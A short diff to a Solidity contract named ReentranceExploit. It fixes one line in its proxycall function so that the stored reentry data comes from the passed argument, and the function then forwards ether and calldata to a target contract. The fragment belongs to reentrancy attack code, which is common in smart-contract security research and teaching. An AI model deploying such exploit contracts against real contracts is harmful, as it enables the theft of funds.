@@ -24,7 +24,7 @@ contract ReentranceExploit {
 		vul_contract = _contract;
 	}
 	function proxycall(bytes data, uint val) payable{
-		reentry_str = _reentry; reentry_val = val;
+		reentry_str = data; reentry_val = val;
 		vul_contract.call.value(val)(data);	//Initial calls.
 	}
 	function get_money(){
